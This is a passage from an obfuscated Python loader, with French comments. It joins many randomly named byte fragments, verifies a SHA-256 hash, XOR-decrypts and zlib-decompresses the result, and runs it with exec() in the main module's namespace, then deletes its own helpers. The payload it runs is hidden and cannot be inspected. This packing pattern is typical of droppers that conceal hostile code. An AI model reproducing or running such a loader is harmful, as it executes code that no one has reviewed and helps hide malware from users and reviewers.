+ _cgamGZfI9FIcSU + _czaYI3JZ6Y5AXw + _cbko0rfCLXtltM + _ctq9SE2uD4w9Tl + _cvHINnMQa9DrDF + _cp_hS5338Qn7jK + _caQgv0YyvngHLp + _coKhKRt20vAtEA + _cjnXQo87BKm25u + _c__SUlwmrpmU1g + _cpD3E4rrfSCAKi + _ckBMIwSwmrBWIw + _csrk1SJcWrqYNj + _cqyd8U_v32aL5j + _cjx9kRZePXZJ9C + _ceWTx4k_ciX7Ql + _ctwkEe1Cw2uZ9K + _cwpszDXi0550Xr + _ceHDZf_OMA2TXC + _cbAjYg9ZPyfNVN + _cq0lmIa8GW0EjY + _cq65jxSWD6u9YB + _cnN0sToTVT0JGT + _c_qOKewBfqg6D6 + _csiaSZdLjdpStQ + _cddT_0oQUzBPvF + _cj5FjV8WZfkcXx + _coXnKf8x4kPag6 + _cqmRelmph4lX5D + _czlYjZpu4sWQOF + _cfaWt3o5_3fhEP + _cnuWAQ9gCxh73i + _ciBduPd4YEJRiO + _cwwi6M1CMWYyWS + _cqtA6LgjALYfvf + _cy4B5IyDfEQWld + _clbjzpBEoss1ZY + _caZFqGU6YtmvSH + _ckLf51QcykgHhf + _ccrP7fKLN8HR1J + _chMKyRCWxzXMRl + _cgsP3c9vrn_Gh8 + _ctjOaCtPVvB1fs + _czc609TXmO0Oyx + _c_ze6qzl3RW57B + _cyOUbT_2Fk2yr1 + _cnybRJXQUYeYK2 + _cyrqInqp0Dw31H + _cjS7LHwBKvT8QP + _ctgG5toZ8l54X3 + _cz99ffwxSmfIg7 + _cpV9lNmsmlJUMA + _cbW_Ek8sOyWJ0Q + _c_UTC2y5rv6bbp + _czoeDOyJO4klBh + _ckOZDS4Zd8Q_jk + _cxJM8XqshXQjTj + _cgq_dt0qwoWBzf + _cmk5ramEt3tjbR + _clwgSWy8TAkxVp + _cbsCgWZPmCSbyj + _cccvY4WfQeLslk + _cwm8q92x6jR2yY + _cmGFrC_h42VsCC + _con6V6SRMgeOwU + _cxs0w1xCxKRAT8 + _cqU6sCYyTZKTpX + _coDChoLL0n5eYj + _cqv6bMZVkr5Aye + _chPmhJ4T1xhpes + _ccU_VSM8DY5_TQ + _cvUmy01ytCgjwm + _ciVZLrHsggAF_j + _chhzmat7N8Oadv + _cmI113mDQJZrkn + _cmR7O8vQn5o3Zu + _cj4m4UyeUUH8lf + _cdwhwPxXKJiu1e + _ciMop216r5qOC5 + _cjAkL1IOifM1gh + _cppMoIJPLnO5I4 + _cpKk2KFPDAQevG + _cscIkgjVPneoSv + _cnF5oECYhUP9Tj + _cgH60EPcBWN3Hw + _cl1zKcS4Ysaxxf + _crIaW4lioeAQIz + _czHomb5We8SpQZ + _cyyNLJFClvaPe_ + _cyoqEJC7s_J8Hi + _chQgecXGaJzf3t + _cdgFMVia6MByeA + _cwtOM1_IBh2RyC + _cosRa2EiLtsRLj + _coKL9HjxnW5LE6 + _cjnoPiiyhNTKD2 + _cbiwsQaNqT0Her + _ciPHpSc7C7m9SB + _czyfmPCtRMhEXi + _ciULCj2g_PoeIp + _crjw_oeRI5Owhd + _cohm4eRajKfcjd + _cvMSU7HzUcMDr9 + _cx_cIAiRHynjgs + _cbF6ToVdjQU8kW + _cwpifwU9anvTMx + _cfhny4zrZ_t2D7 + _ctl_U18FRxf_vu + _cp5dV_oZIWf8Pk + _cl1JJW7UZRUWy7 + _cdh8Rsa9oDMj85 + _cc8eCMlXRCSNv8 + _cuVH3bARqMokK6 + _coeuTun48OXJ8h + _ciRzF3W6i5zKFc + _cyQFRQVOC4N6qR + _csbMacO7of2MZH + _cf46oX6WXU42p1 + _ckJVmEzkfm1xbp + _cuxq4B1Zp1bzGq + _cuGtyP_1V3rlam + _cj8rb7ds1in9DF + _ch9HqGWAYs49H9 + _cp0kQjfKLFiKaJ + _cah8s8eyZbmNmV + _csAVlUi6jYOMbD + _csq7RNP6hLhCdp + _cu2PIPmg9S6u92 + _csSV5fb3F10IC3 + _cwSt02O3yn04ya + _cmfeIu3vxvqO6m + _cha9YtJ8o1xyOM + _clS788WvHLOTRC + _cgTagTB5Pu2e_W + _cvOlY0XOkWUOF0 + _c_Rd0LiKrskMKK + _cmxTqne4Dy_4pl)
if __import__('hashlib').sha256(_pfXSD4QwOBgYBb).hexdigest() != 'f8b489448f7191dbd8f734411ddd842e2bfe5a0f0443e07a510e9dc4c8949127':
    __import__('sys').exit(1)
_xqGkj_sNzAWa5l = bytes([59, 116, 217, 164, 175, 114, 135, 225, 140, 93, 99, 231, 111, 229, 251, 168, 172, 113, 113, 16, 165, 123, 110, 135, 138, 97])
_fklWC5FBTLQZVik = bytes([19, 47, 2, 64, 251, 63, 22, 6, 32, 45, 26, 26, 65, 0, 248, 185, 104, 225, 163, 76, 97, 25, 74, 23, 118, 19])

def _fxxyLSgv3fquEDy(_betFzcXqPgBPDi, _k_hRsTSqRSmRUQ):
    return bytes(_betFzcXqPgBPDi[_is1PiiQOfjbpCe] ^ _k_hRsTSqRSmRUQ[_is1PiiQOfjbpCe % len(_k_hRsTSqRSmRUQ)] for _is1PiiQOfjbpCe in range(len(_betFzcXqPgBPDi)))

def _fdad4Ni0RIkP1jj(_twt67Nhax7egBq):
    import zlib
    return zlib.decompress(_twt67Nhax7egBq) # Un seul niveau de zlib ici pour simplifier

def _feppoEuxV6Y_p9L():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xtZPY46If287vS = _fxxyLSgv3fquEDy(_pfXSD4QwOBgYBb, _xqGkj_sNzAWa5l)
    # 2. Décompression Zlib
    _duD3vLojzuRrQO = _fdad4Ni0RIkP1jj(_xtZPY46If287vS)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _duD3vLojzuRrQO.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nbrBxaaUgSuyz_ = _main.__dict__
    _nbrBxaaUgSuyz_.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nbrBxaaUgSuyz_)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feppoEuxV6Y_p9L()
try:
    del _fxxyLSgv3fquEDy, _fdad4Ni0RIkP1jj, _feppoEuxV6Y_p9L
    del _pfXSD4QwOBgYBb, _xqGkj_sNzAWa5l, _fklWC5FBTLQZVik
except:
    pass
